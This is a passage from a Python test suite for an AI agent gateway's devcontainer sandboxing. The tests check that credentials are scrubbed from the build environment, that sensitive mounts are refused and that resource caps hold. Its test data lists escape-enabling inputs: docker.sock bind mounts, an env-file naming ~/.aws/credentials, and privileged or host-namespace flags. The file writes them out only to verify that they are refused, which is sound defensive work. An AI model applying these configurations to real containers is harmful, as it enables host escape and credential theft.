            {"image": "x", "runArgs": ["--mount", "type=volume,source=myvol,dst=/data"]},
        )
        cfg = devc.find_devcontainer_config(project)
        assert cfg is not None
        devc.config_digest(cfg)


class TestDockerBinaryResolutionStaysOffTheEventLoop:
    """No `async def` may call ``_docker_bin`` directly.

    ``_docker_bin`` walks PATH stat-ing each candidate and every ancestor
    directory, so one unresponsive entry stalls the whole gateway. Asserted as a
    source-level invariant rather than by listing today's call sites: the previous
    round offloaded three sibling probes, missed this one, and a
    call-site-by-call-site test would have gone green while six async sites still
    blocked. A ratchet fails for a NEW site too.
    """

    @staticmethod
    def _async_direct_callers() -> list[tuple[int, str]]:
        import ast

        source = Path(devc.__file__).read_text(encoding="utf-8")
        tree = ast.parse(source)
        spans: dict[int, tuple[str, bool, int]] = {}
        for node in ast.walk(tree):
            if isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef)):
                width = (node.end_lineno or node.lineno) - node.lineno
                for line in range(node.lineno, (node.end_lineno or node.lineno) + 1):
                    prev = spans.get(line)
                    if prev is None or width < prev[2]:
                        spans[line] = (node.name, isinstance(node, ast.AsyncFunctionDef), width)
        hits = []
        for node in ast.walk(tree):
            if isinstance(node, ast.Call):
                name = getattr(node.func, "id", None) or getattr(node.func, "attr", None)
                if name == "_docker_bin":
                    owner = spans.get(node.lineno)
                    if owner and owner[1]:
                        hits.append((node.lineno, owner[0]))
        return hits

    def test_no_async_function_resolves_the_docker_binary_inline(self) -> None:
        offenders = self._async_direct_callers()
        assert offenders == [], (
            "these async functions resolve docker on the event loop; use "
            f"_docker_bin_async(): {offenders}"
        )

    def test_no_async_caller_reaches_the_resolver_through_a_sync_helper(self) -> None:
        """The direct check above is not sufficient, and this is why.

        It passed while `containerize_spawn` -> `exec_argv` -> `_docker_bin` ran on
        the loop from both ACP spawn paths: every frame in that chain except the
        entry point is synchronous, so a one-frame check sees nothing. The
        synchronous helpers that reach the resolver must therefore never be called
        from a coroutine without an offload.
        """
        import ast

        source = Path(devc.__file__).read_text(encoding="utf-8")
        tree = ast.parse(source)

        # Sync functions in this module that reach _docker_bin, directly or via
        # another sync function here.
        sync_callees: dict[str, set[str]] = {}
        for node in ast.walk(tree):
            if isinstance(node, ast.FunctionDef):  # sync defs only
                names = set()
                for sub in ast.walk(node):
                    if isinstance(sub, ast.Call):
                        nm = getattr(sub.func, "id", None) or getattr(sub.func, "attr", None)
                        if nm:
                            names.add(nm)
                sync_callees.setdefault(node.name, set()).update(names)

        tainted = {"_docker_bin"}
        for _ in range(len(sync_callees) + 1):  # fixpoint
            grew = False
            for name, callees in sync_callees.items():
                if name not in tainted and (callees & tainted):
                    tainted.add(name)
                    grew = True
            if not grew:
                break
        tainted.discard("_docker_bin")

        # `exec_argv` is the one this missed; assert the chain is still recognized
        # so a rename cannot quietly empty this test.
        assert "exec_argv" in tainted, (
            "exec_argv no longer reaches _docker_bin -- if that is deliberate, "
            "update this test; if it was renamed, the ratchet is now vacuous"
        )

        # No coroutine in the ACP spawn paths may call a tainted helper without
        # an offload. Those paths are the reachable ones from a live session.
        offenders = []
        for rel in ("acp/client.py", "acp/runtime.py"):
            path = Path(devc.__file__).parent / rel
            src = path.read_text(encoding="utf-8")
            atree = ast.parse(src)
            for node in ast.walk(atree):
                if not isinstance(node, ast.AsyncFunctionDef):
                    continue
                for sub in ast.walk(node):
                    if not isinstance(sub, ast.Call):
                        continue
                    nm = getattr(sub.func, "id", None) or getattr(sub.func, "attr", None)
                    if nm in tainted or nm == "containerize_spawn":
                        # to_thread(fn, ...) passes the callable as an ARG, so the
                        # offloaded form is not a direct call and never lands here.
                        offenders.append(f"{rel}:{sub.lineno} {node.name} -> {nm}")
        assert offenders == [], (
            "these coroutines reach the docker resolver through a sync helper; "
            f"wrap the call in asyncio.to_thread: {offenders}"
        )

    def test_the_async_wrapper_actually_offloads(self) -> None:
        """Guards the other direction: a wrapper that called through directly
        would satisfy the ratchet above while still blocking."""
        import inspect

        src = inspect.getsource(devc._docker_bin_async)
        assert "asyncio.to_thread" in src


class TestBuildEnvUsesTheFullScrub:
    """The build environment must not carry the gateway's own credentials.

    The weaker parent scrub deliberately preserves AWS/SSH/GPG so the host
    ``standard`` sandbox keeps git-over-SSH, the AWS CLI and kubectl working --
    the agent runs as this uid there and could read them anyway. Neither premise
    holds for the environment handed to ``devcontainer up``: a trusted config
    naming ``${localEnv:AWS_SECRET_ACCESS_KEY}`` materializes the credential
    inside the container, where build-time and lifecycle commands see it.
    """

    def test_credential_prefixes_are_dropped(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setenv("AWS_SECRET_ACCESS_KEY", "shh")
        monkeypatch.setenv("AWS_SESSION_TOKEN", "shh2")
        monkeypatch.setenv("SSH_AUTH_SOCK", "/tmp/agent.sock")
        env = devc._scrubbed_build_env()
        assert "AWS_SECRET_ACCESS_KEY" not in env
        assert "AWS_SESSION_TOKEN" not in env
        assert "SSH_AUTH_SOCK" not in env

    def test_the_channel_scrub_is_not_regressed(self, monkeypatch: pytest.MonkeyPatch) -> None:
        """The stronger scrub's prefix list is a superset, so swapping to it must
        not reintroduce anything the weaker one removed."""
        from kiro_crew import sandbox as sb

        for key in sb._AGENT_DENIED_ENV_KEYS:
            monkeypatch.setenv(key, "x")
        env = devc._scrubbed_build_env()
        assert [k for k in sb._AGENT_DENIED_ENV_KEYS if k in env] == []

    def test_the_variables_the_cli_needs_survive(self, monkeypatch: pytest.MonkeyPatch) -> None:
        """Acceptance case: scrubbing must not strip PATH/HOME, or the CLI cannot
        run at all and the fix trades a leak for a broken feature."""
        monkeypatch.setenv("PATH", "/usr/bin")
        monkeypatch.setenv("HOME", "/home/dev")
        # Isolation: this test is the allowlist, not the writability filter.
        monkeypatch.setattr(devc, "_agent_writable", lambda path: None)
        env = devc._scrubbed_build_env()
        assert env.get("PATH") == "/usr/bin"
        assert env.get("HOME") == "/home/dev"

    def test_a_writable_path_entry_is_stripped(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """The CLI resolves node/docker from this PATH. A writable entry is a
        planted-shim vector; verifying argv is not enough if the env still
        leads with a directory the agent writes."""
        planted = tmp_path / "agent-bin"
        planted.mkdir()
        monkeypatch.setenv("PATH", f"{planted}{os.pathsep}/usr/bin")
        env = devc._scrubbed_build_env()
        parts = env.get("PATH", "").split(os.pathsep)
        assert str(planted) not in parts
        assert "/usr/bin" in parts


class TestForwardedSecretPathsAreRefusedAsMounts:
    """``DOCKER_CERT_PATH`` / ``DOCKER_CONFIG`` are forwarded so the daemon
    can authenticate. They are not in the fixed sensitive-path list, so a
    trusted config naming ``${localEnv:DOCKER_CERT_PATH}`` as a bind would
    hand the TLS private key to the agent. Screen the live value.
    """

    @staticmethod
    def _cfg(tmp_path: Path, source: str) -> Path:
        project = tmp_path / "proj"
        project.mkdir(parents=True)
        dc = project / ".devcontainer"
        dc.mkdir()
        (dc / "devcontainer.json").write_bytes(
            json.dumps({"image": "x", "mounts": [f"source={source},target=/t,type=bind"]}).encode()
        )
        cfg = devc.find_devcontainer_config(project)
        assert cfg is not None
        return cfg

    def test_the_cert_dir_itself_is_refused(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        certs = tmp_path / "docker-certs"
        certs.mkdir()
        monkeypatch.setenv("DOCKER_CERT_PATH", str(certs))
        cfg = self._cfg(tmp_path / "tree", str(certs))
        with pytest.raises(devc.DevcontainerError, match="forwarded credential path"):
            devc.config_digest(cfg)

    def test_localenv_expansion_is_refused(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        certs = tmp_path / "docker-certs"
        certs.mkdir()
        monkeypatch.setenv("DOCKER_CERT_PATH", str(certs))
        cfg = self._cfg(tmp_path / "tree", "${localEnv:DOCKER_CERT_PATH}")
        with pytest.raises(devc.DevcontainerError, match="forwarded credential path"):
            devc.config_digest(cfg)

    def test_an_ancestor_of_the_cert_dir_is_refused(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        certs = tmp_path / "docker-certs"
        certs.mkdir()
        monkeypatch.setenv("DOCKER_CERT_PATH", str(certs))
        cfg = self._cfg(tmp_path / "tree", str(tmp_path))
        with pytest.raises(devc.DevcontainerError, match="forwarded credential path"):
            devc.config_digest(cfg)

    def test_an_unrelated_path_is_not_refused(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        certs = tmp_path / "docker-certs"
        certs.mkdir()
        other = tmp_path / "innocent"
        other.mkdir()
        monkeypatch.setenv("DOCKER_CERT_PATH", str(certs))
        cfg = self._cfg(tmp_path / "tree", str(other))
        # Must not raise — a set-but-unrelated var is not a blanket deny.
        devc.config_digest(cfg)


class TestBuildOutputIsBounded:
    """Build output must not accumulate in the gateway's heap.

    ``communicate()`` buffers each pipe in full for the whole 15-minute budget, so
    a lifecycle command that prints steadily grows the GATEWAY until it is
    OOM-killed -- the process that dies is not the build.
    """

    @pytest.mark.asyncio
    async def test_only_the_tail_is_retained(self) -> None:
        class _Stream:
            def __init__(self, total: int) -> None:
                self.left = total

            async def read(self, n: int = -1) -> bytes:
                if self.left <= 0:
                    return b""
                take = min(n if n > 0 else 65536, self.left)
                self.left -= take
                return b"x" * take

        keep = 1024
        out, over = await devc._read_capped(_Stream(10 * keep), keep=keep, limit=1 << 30)
        assert not over
        assert len(out) == keep, "buffer must be bounded by keep, not by input size"

    @pytest.mark.asyncio
    async def test_the_tail_is_the_end_not_the_start(self) -> None:
        """The CLI's outcome JSON is its LAST line and the failure path shows a
        stderr tail, so retaining the head would discard exactly what is read."""

        class _Stream:
            def __init__(self, chunks: list[bytes]) -> None:
                self.chunks = list(chunks)

            async def read(self, n: int = -1) -> bytes:
                return self.chunks.pop(0) if self.chunks else b""

        out, _ = await devc._read_capped(
            _Stream([b"AAAA", b"BBBB", b"ZEND"]), keep=4, limit=1 << 30
        )
        assert out == b"ZEND"

    @pytest.mark.asyncio
    async def test_passing_the_hard_ceiling_is_reported(self) -> None:
        # Finite deliberately. An endless stream is the realistic runaway, but it
        # makes a missing ceiling check HANG instead of failing, and a
        # revert-verify that prints no pass/fail line proves nothing. Three 4 KiB
        # chunks against an 8 KiB limit exceed it on the third and still end.
        class _Stream:
            def __init__(self) -> None:
                self.left = 3

            async def read(self, n: int = -1) -> bytes:
                if self.left <= 0:
                    return b""
                self.left -= 1
                return b"y" * 4096

        out, over = await devc._read_capped(_Stream(), keep=128, limit=8192)
        assert over is True, "the ceiling must be reported so the caller can kill the child"

    @pytest.mark.asyncio
    async def test_a_stream_is_drained_rather_than_left_unread(self) -> None:
        """An unread pipe fills its OS buffer and blocks the child, which would
        trade the out-of-memory failure for a silent hang."""
        reads = {"n": 0}

        class _Stream:
            async def read(self, n: int = -1) -> bytes:
                reads["n"] += 1
                return b"z" * 512 if reads["n"] <= 5 else b""

        await devc._read_capped(_Stream(), keep=64, limit=1 << 30)
        assert reads["n"] == 6, "must read to EOF, not stop once the tail buffer is full"


class TestRunArgSpellingsAreAllScreened:
    """Every spelling docker accepts for an attached value must be screened.

    Four consecutive review rounds landed a finding in this span, each a
    different spelling of one hazard, because every consumer re-implemented
    docker's argument grammar with its own ad-hoc set of cases. The parsing now
    lives in one tokenizer; this enumerates the grid so a missing cell fails here
    instead of in review.
    """

    @staticmethod
    def _project(tmp_path: Path, run_args: list[str]) -> Path:
        project = tmp_path / uuid.uuid4().hex[:8]
        dc = project / ".devcontainer"
        dc.mkdir(parents=True)
        (dc / "devcontainer.json").write_bytes(
            json.dumps({"image": "x", "runArgs": run_args}).encode()
        )
        return project

    # source=/var/run/docker.sock in every spelling docker accepts.
    @pytest.mark.parametrize(
        "run_args",
        [
            ["-v", "/var/run/docker.sock:/sock"],
            ["-v/var/run/docker.sock:/sock"],
            ["-v=/var/run/docker.sock:/sock"],
            ["--volume", "/var/run/docker.sock:/sock"],
            ["--volume=/var/run/docker.sock:/sock"],
            ["--device", "/var/run/docker.sock"],
            ["--device=/var/run/docker.sock"],
        ],
        ids=[
            "short-separate",
            "short-attached",
            "short-equals",
            "long-separate",
            "long-equals",
            "device-separate",
            "device-equals",
        ],
    )
    def test_a_control_socket_is_refused_in_every_spelling(
        self, tmp_path: Path, run_args: list[str]
    ) -> None:
        project = self._project(tmp_path, run_args)
        cfg = devc.find_devcontainer_config(project)
        assert cfg is not None
        with pytest.raises(devc.DevcontainerError, match="host control interface"):
            devc.config_digest(cfg)

    @pytest.mark.parametrize(
        "run_args",
        [
            ["--env-file", "SENTINEL"],
            ["--env-file=SENTINEL"],
        ],
        ids=["separate", "equals"],
    )
    def test_a_host_file_flag_is_screened_in_both_spellings(
        self, tmp_path: Path, run_args: list[str]
    ) -> None:
        aws = os.path.join(os.path.expanduser("~"), ".aws", "credentials")
        project = self._project(tmp_path, [a.replace("SENTINEL", aws) for a in run_args])
        cfg = devc.find_devcontainer_config(project)
        assert cfg is not None
        with pytest.raises(devc.DevcontainerError, match="sensitive host path"):
            devc.config_digest(cfg)

    def test_the_tokenizer_splits_each_form_identically(self) -> None:
        """Asserted on the tokenizer directly as well as through the screen: the
        grid above proves the outcome, this pins WHY, so a future consumer reading
        the same pairs cannot be handed a different split."""
        forms = [
            ["-v", "/h:/c"],
            ["-v/h:/c"],
            ["-v=/h:/c"],
            ["--volume", "/h:/c"],
            ["--volume=/h:/c"],
        ]
        for flags in forms:
            assert devc._iter_run_flags(flags) == [("--volume", "/h:/c")], flags

    def test_a_bare_flag_with_no_value_does_not_swallow_the_next_flag(self) -> None:
        """`--privileged --rm` must not read --rm as --privileged's value."""
        pairs = devc._iter_run_flags(["--privileged", "--rm"])
        assert pairs == [("--privileged", None), ("--rm", None)]


class TestUnlimitedValuesDoNotSuppressCeilings:
    """Docker reads `-1`/`0` as UNLIMITED, so they are not a ceiling.

    A pure presence check made the most explicit way to ask for no limit also the
    way to suppress the default cap -- the config said the opposite of what the
    check concluded, and the container could exhaust host processes or memory.
    """

    @pytest.mark.parametrize(
        ("run_args", "flag"),
        [
            (["--pids-limit=-1"], "--pids-limit"),
            (["--pids-limit", "-1"], "--pids-limit"),
            (["--pids-limit=0"], "--pids-limit"),
            (["--memory=0"], "--memory"),
            (["--memory", "0"], "--memory"),
        ],
        ids=["pids-eq-neg", "pids-sep-neg", "pids-zero", "mem-eq-zero", "mem-sep-zero"],
    )
    def test_an_unlimited_value_reads_as_absent(self, run_args: list[str], flag: str) -> None:
        assert devc._has_run_flag(run_args, flag) is False

    @pytest.mark.parametrize(
        ("run_args", "flag"),
        [
            (["--pids-limit=512"], "--pids-limit"),
            (["--memory=512m"], "--memory"),
            (["--memory", "2g"], "--memory"),
        ],
        ids=["pids-real", "mem-suffix", "mem-sep-suffix"],
    )
    def test_a_real_ceiling_is_still_honored(self, run_args: list[str], flag: str) -> None:
        """Acceptance case: honoring the repo's explicit limit is the point of the
        feature, so a genuine value must NOT be overridden."""
        assert devc._has_run_flag(run_args, flag) is True

    def test_the_default_cap_is_injected_over_an_unlimited_value(self) -> None:
        parsed: dict = {"image": "x", "runArgs": ["--pids-limit=-1", "--memory=0"]}
        devc._apply_default_resource_caps(parsed)
        args = parsed["runArgs"]
        # The caps are appended; docker takes the LAST occurrence, so the
        # injected ceiling wins over the unlimited one already present.
        assert "--pids-limit" in args
        assert args.index("--pids-limit") > args.index("--pids-limit=-1")
        assert "--memory" in args

    def test_a_soft_reservation_still_does_not_suppress_the_hard_cap(self) -> None:
        """The earlier defect in this same helper: --memory-reservation CONTAINS
        --memory, and a substring test let it suppress the hard ceiling."""
        assert devc._has_run_flag(["--memory-reservation", "128m"], "--memory") is False


class TestGovernanceFloorOutranksTheContainer:
    """An enterprise ``sandbox.min_level`` floor must not be silently inert.

    The floor is read INSIDE ``wrap_argv``, and a containerized spawn skips
    ``wrap_argv``, so before this gate an operator who set policy
    ``sandbox.min_level: strict`` had it ignored on every containerized session --
    and the dashboard reported that session as confined. Running on the host,
    where the floor is actually implemented, is the conservative reading: the
    container is a different mechanism, not a tier the floor names.

    Every case forces ``sys.platform`` to linux so a Desktop-specific extra_hosts
    injection cannot change which gate this class is measuring.
    """

    @staticmethod
    def _force_linux(monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setattr(devc.sys, "platform", "linux")

    @pytest.mark.asyncio
    async def test_a_floor_sends_the_session_to_the_host(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        project = tmp_path / "proj"
        project.mkdir()
        _write_primary(project)
        self._force_linux(monkeypatch)
        monkeypatch.setattr(devc, "devcontainers_enabled", lambda: True)
        monkeypatch.setattr(devc, "governed_sandbox_floor", lambda: "strict")

        def _boom() -> bool:
            raise AssertionError("docker must not be probed once a floor is in force")

        monkeypatch.setattr(devc, "docker_available", _boom)
        info, locus = await devc.resolve_with_locus(project)
        assert info is None
        assert locus is not None
        assert locus.mode == "host"
        assert locus.reason == devc.HOST_REASON_SANDBOX_FLOOR

    @pytest.mark.asyncio
    async def test_an_unresolvable_policy_is_treated_as_governed(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """Fail CLOSED. A host that cannot compose its policy is exactly the host
        that was supposed to be governed, so reading 'no floor' there would
        downgrade the control being consulted."""
        project = tmp_path / "proj"
        project.mkdir()
        _write_primary(project)
        self._force_linux(monkeypatch)
        monkeypatch.setattr(devc, "devcontainers_enabled", lambda: True)

        def _raise() -> str | None:
            raise RuntimeError("policy could not be composed")

        monkeypatch.setattr(devc, "governed_sandbox_floor", _raise)
        info, locus = await devc.resolve_with_locus(project)
        assert info is None
        assert locus is not None and locus.reason == devc.HOST_REASON_SANDBOX_FLOOR

    @pytest.mark.asyncio
    async def test_no_floor_still_allows_the_container(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """Acceptance case: the gate must not disable the feature on every host,
        only on governed ones."""
        project = tmp_path / "proj"
        project.mkdir()
        _write_primary(project)
        self._force_linux(monkeypatch)
        monkeypatch.setattr(devc, "devcontainers_enabled", lambda: True)
        monkeypatch.setattr(devc, "governed_sandbox_floor", lambda: None)
        # Stop at the docker probe: reaching it proves the floor gate let us past.
        monkeypatch.setattr(devc, "docker_available", lambda: False)
        info, locus = await devc.resolve_with_locus(project)
        assert info is None
        assert locus is not None
        assert locus.reason == devc.HOST_REASON_DOCKER_UNAVAILABLE

    def test_the_floor_reader_is_shared_with_the_sandbox(self) -> None:
        """Not a re-derivation: the container gate and wrap_argv's clamp must read
        the same source, or they can disagree about whether a host is governed."""
        import inspect

        src = inspect.getsource(devc.governed_sandbox_floor)
        assert "_governance_sandbox_floor" in src


class TestContainerCpuCeilings:
    """CPU must be bounded on the container path too.

    ``_apply_default_resource_caps`` read ``CPUWeight`` and the opt-in
    ``CPUQuota`` from the operator's config and discarded both, so a containerized
    agent had no CPU bound at all. Namespaces isolate what a process can SEE, not
    what it can consume.

    The limit reader is patched on ``kiro_crew.sandbox``, its defining module:
    devcontainer imports it inside each function to avoid an import cycle, so it
    is never an attribute of ``devcontainer`` to patch.
    """

    @staticmethod
    def _sandbox_module():  # type: ignore[no-untyped-def]
        import kiro_crew.sandbox as sb

        return sb

    def test_a_proportional_share_is_injected(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setattr(
            self._sandbox_module(), "_cgroup_limits_from_config", lambda: (512, 2048, 50, 0)
        )
        parsed: dict = {"image": "x"}
        devc._apply_default_resource_caps(parsed)
        args = parsed["runArgs"]
        assert "--cpu-shares" in args
        # CPUWeight 50 is half of systemd's neutral 100, so half of docker's 1024.
        assert args[args.index("--cpu-shares") + 1] == "512"

    def test_the_hard_quota_is_opt_in(self, monkeypatch: pytest.MonkeyPatch) -> None:
        """A hard cap slows legitimate builds, so it appears only when the operator
        set max_cpu_percent -- matching the host scope's own posture."""
        monkeypatch.setattr(
            self._sandbox_module(), "_cgroup_limits_from_config", lambda: (512, 2048, 50, 0)
        )
        parsed: dict = {"image": "x"}
        devc._apply_default_resource_caps(parsed)
        assert "--cpus" not in parsed["runArgs"]

        monkeypatch.setattr(
            self._sandbox_module(), "_cgroup_limits_from_config", lambda: (512, 2048, 50, 150)
        )
        parsed2: dict = {"image": "x"}
        devc._apply_default_resource_caps(parsed2)
        args = parsed2["runArgs"]
        assert args[args.index("--cpus") + 1] == "1.5"

    def test_an_explicit_project_cpu_value_wins(self, monkeypatch: pytest.MonkeyPatch) -> None:
        """Honoring the repo's config is the point of the feature; overriding a
        deliberate value would make the container differ from what was reviewed."""
        monkeypatch.setattr(
            self._sandbox_module(), "_cgroup_limits_from_config", lambda: (512, 2048, 50, 150)
        )
        parsed: dict = {"image": "x", "runArgs": ["--cpu-shares=64", "--cpus=0.5"]}
        devc._apply_default_resource_caps(parsed)
        args = parsed["runArgs"]
        assert args.count("--cpu-shares") == 0, args
        assert args.count("--cpus") == 0, args

    def test_the_weight_mapping_is_clamped_to_dockers_range(self) -> None:
        """A weight mapping below docker's floor would be rejected by the daemon
        and fail the build, turning a DoS ceiling into an outage."""
        assert devc._docker_cpu_shares(1) >= 2
        assert devc._docker_cpu_shares(100) == 1024
        assert devc._docker_cpu_shares(10**9) <= 262144

    def test_compose_services_get_the_same_ceilings(self, monkeypatch: pytest.MonkeyPatch) -> None:
        """Compose spells them differently and ignores runArgs, so without this a
        compose devcontainer was the one shape with no CPU bound."""
        import yaml as y

        monkeypatch.setattr(
            self._sandbox_module(), "_cgroup_limits_from_config", lambda: (512, 2048, 50, 150)
        )
        out = devc._compose_hardened(
            y.safe_dump({"services": {"app": {"image": "alpine"}}}).encode(), "/base"
        )
        svc = y.safe_load(out.decode())["services"]["app"]
        assert svc["cpu_shares"] == 512
        assert svc["cpus"] == "1.5"


class TestPrivilegedModesAreRefused:
    """A privileged container makes every bind screen in this module moot.

    The screens read what the config DECLARES, which is only informative while the
    container cannot reach storage it never declared. ``--privileged`` grants
    exactly that -- the agent can mount a host block device from inside -- so a
    config declaring no sensitive path becomes indistinguishable from one
    declaring all of them, and the trust prompt would promise something it cannot
    keep. Refused rather than screened: the escalation is a capability, not a path.
    """

    @staticmethod
    def _project(tmp_path: Path, cfg: dict) -> Path:
        project = tmp_path / uuid.uuid4().hex[:8]
        dc = project / ".devcontainer"
        dc.mkdir(parents=True)
        (dc / "devcontainer.json").write_bytes(json.dumps(cfg).encode())
        return project

    @pytest.mark.parametrize(
        "run_args",
        [
            ["--privileged"],
            ["--privileged=true"],
            ["--cap-add", "SYS_ADMIN"],
            ["--cap-add=SYS_ADMIN"],
            ["--cap-add=sys_admin"],
            ["--cap-add=ALL"],
            ["--pid=host"],
            ["--pid", "host"],
            ["--network=host"],
            ["--net=host"],
            ["--net", "host"],
            ["--ipc=host"],
            ["--uts=host"],
            ["--userns=host"],
            ["--cgroupns=host"],
        ],
        ids=[
            "privileged-bare",
            "privileged-true",
            "cap-separate",
            "cap-equals",
            "cap-lowercase",
            "cap-all",
            "pid-equals",
            "pid-separate",
            "network",
            "net-alias-equals",
            "net-alias-separate",
            "ipc",
            "uts",
            "userns",
            "cgroupns",
        ],
    )
    def test_an_escalating_mode_is_refused(self, tmp_path: Path, run_args: list[str]) -> None:
        project = self._project(tmp_path, {"image": "x", "runArgs": run_args})
        cfg = devc.find_devcontainer_config(project)
        assert cfg is not None
        with pytest.raises(devc.DevcontainerError):
            devc.config_digest(cfg)

    def test_an_ordinary_config_is_still_accepted(self, tmp_path: Path) -> None:
        """Acceptance case: the refusal must not reject the flags a normal
        devcontainer uses, or the feature becomes unusable rather than bounded.

        ``--pid=container:x`` was in this list and is deliberately no longer:
        joining another container's PID namespace is not an ordinary flag, and
        listing it here did not just miss that -- it asserted the gap was correct
        behaviour, so this test would have failed the fix for it. See
        ``test_a_sibling_namespace_is_refused``.
        """
        project = self._project(
            tmp_path,
            {"image": "x", "runArgs": ["--init", "--rm", "--cap-add=NET_ADMIN"]},
        )
        cfg = devc.find_devcontainer_config(project)
        assert cfg is not None
        devc.config_digest(cfg)

    def test_privileged_false_is_not_treated_as_a_request(self, tmp_path: Path) -> None:
        """`--privileged=false` asks for nothing; refusing it would be a false
        positive on a config that is explicitly declining the grant."""
        project = self._project(tmp_path, {"image": "x", "runArgs": ["--privileged=false"]})
        cfg = devc.find_devcontainer_config(project)
        assert cfg is not None
        devc.config_digest(cfg)

    @pytest.mark.parametrize(
        "svc",
        [
            {"image": "alpine", "privileged": True},
            {"image": "alpine", "cap_add": ["SYS_ADMIN"]},
            {"image": "alpine", "cap_add": ["ALL"]},
            {"image": "alpine", "network_mode": "host"},
            {"image": "alpine", "pid": "host"},
            {"image": "alpine", "ipc": "host"},
            {"image": "alpine", "userns_mode": "host"},
            {"image": "alpine", "cgroup": "host"},
        ],
        ids=[
            "privileged",
            "cap-sys-admin",
            "cap-all",
            "network-mode",
            "pid",
            "ipc",
            "userns-mode",
            "cgroup",
        ],
    )
    def test_the_compose_spelling_is_refused_too(self, tmp_path: Path, svc: dict) -> None:
        """The runArgs fix alone would leave the identical hole reachable by
        writing the config as compose instead."""
        import yaml as y

        project = tmp_path / uuid.uuid4().hex[:8]
        dc = project / ".devcontainer"
        dc.mkdir(parents=True)
        (dc / "compose.yml").write_text(y.safe_dump({"services": {"app": svc}}), encoding="utf-8")
        (dc / "devcontainer.json").write_bytes(
            json.dumps({"dockerComposeFile": "compose.yml", "service": "app"}).encode()
        )
        cfg = devc.find_devcontainer_config(project)
        assert cfg is not None
        with pytest.raises(devc.DevcontainerError):
            devc.config_digest(cfg)


class TestComposeUnlimitedLimitsDoNotSuppressCaps:
    """Compose forwards `-1`/`0` to the runtime as unlimited.

    The runArgs path already reads those as absent; the compose path used a
    presence-only check, so the compose spelling of the same hazard let the most
    explicit way to ask for no ceiling also suppress the injected default.
    """

    @staticmethod
    def _harden(svc: dict, monkeypatch: pytest.MonkeyPatch) -> dict:
        import yaml as y

        import kiro_crew.sandbox as sb

        monkeypatch.setattr(sb, "_cgroup_limits_from_config", lambda: (512, 2048, 50, 0))
        out = devc._compose_hardened(y.safe_dump({"services": {"app": svc}}).encode(), "/base")
        return y.safe_load(out.decode())["services"]["app"]

    @pytest.mark.parametrize(
        ("key", "value"),
        [
            ("pids_limit", -1),
            ("pids_limit", 0),
            ("mem_limit", 0),
            ("mem_limit", "0"),
            ("mem_limit", "-1"),
        ],
        ids=["pids-neg", "pids-zero", "mem-zero-int", "mem-zero-str", "mem-neg-str"],
    )
    def test_an_unlimited_value_is_replaced_with_the_cap(
        self, key: str, value: object, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        svc = self._harden({"image": "alpine", key: value}, monkeypatch)
        assert svc[key] not in (-1, 0, "0", "-1"), f"{key} still unlimited: {svc[key]!r}"

    def test_a_real_value_is_preserved(self, monkeypatch: pytest.MonkeyPatch) -> None:
        """Honoring the repo's explicit limit is the point of the feature."""
        svc = self._harden({"image": "alpine", "pids_limit": 64, "mem_limit": "256m"}, monkeypatch)
        assert svc["pids_limit"] == 64
        assert svc["mem_limit"] == "256m"

    def test_an_unlimited_memswap_is_not_left_in_place(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """setdefault would have kept `memswap_limit: -1`, re-granting unlimited
        swap against a bounded mem_limit."""
        svc = self._harden({"image": "alpine", "memswap_limit": -1}, monkeypatch)
        assert svc["memswap_limit"] != -1


class TestOnlyKiroIsContainerized:
    """Containerizing must never swap the selected harness for kiro-cli.

    The containerized argv is built from ``KIRO_CLI_BIN`` and runs it from the
    image's PATH. For any other backend that discards the harness the user
    selected while the session still reports the chosen backend -- the
    lowest-common-denominator collapse harness parity (H9/H10) forbids, and a
    capability granted to a harness the PR never mentions (H6/H7).

    Gated inside ``_maybe_devcontainer_info`` rather than at the call site, so a
    later spawn path cannot containerize by forgetting the check.
    """

    def test_the_capability_set_names_only_kiro(self) -> None:
        from kiro_crew.acp.types import (
            ACP_BACKEND_CLAUDE,
            ACP_BACKEND_KAS,
            ACP_BACKEND_KIRO,
            ACP_BACKENDS_DEVCONTAINER,
        )

        assert ACP_BACKEND_KIRO in ACP_BACKENDS_DEVCONTAINER
        assert ACP_BACKEND_KAS not in ACP_BACKENDS_DEVCONTAINER
        assert ACP_BACKEND_CLAUDE not in ACP_BACKENDS_DEVCONTAINER

    def test_membership_is_a_named_set_not_an_inline_comparison(self) -> None:
        """H6/H7 requires the predicate BE a named ACP_BACKENDS_* set. An inline
        `== ACP_BACKEND_KIRO` would fix the bug and still violate the rule, so the
        shape is asserted, not just the behaviour."""
        for rel in ("acp/runtime.py", "acp/client.py"):
            src = (Path(devc.__file__).parent / rel).read_text(encoding="utf-8")
            assert "ACP_BACKENDS_DEVCONTAINER" in src, rel
            assert "_maybe_devcontainer_info" in src, rel

    @pytest.mark.asyncio
    async def test_a_non_kiro_backend_never_resolves_a_container(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """The decisive behavioural check: with KAS selected the resolver must not
        even be consulted, so no container can be handed to the spawn."""
        from kiro_crew.acp import runtime as rt
        from kiro_crew.acp.types import ACP_BACKEND_KAS, ACP_BACKEND_KIRO

        called: list[str] = []

        async def _resolver(work_dir: object) -> tuple[object, object]:
            called.append(str(work_dir))
            return object(), None

        monkeypatch.setattr("kiro_crew.devcontainer.resolve_with_locus", _resolver, raising=False)

        class _Stub:
            _work_dir = "/proj"

            def __init__(self, backend: str) -> None:
                self._acp_backend = backend

            _maybe_devcontainer_info = rt.AcpRuntime._maybe_devcontainer_info

        assert await _Stub(ACP_BACKEND_KAS)._maybe_devcontainer_info() is None
        assert called == [], "the resolver must not run for a non-kiro backend"

        # Positive control: the same seam DOES resolve for kiro, so the assertion
        # above cannot pass merely because the resolver is unreachable.
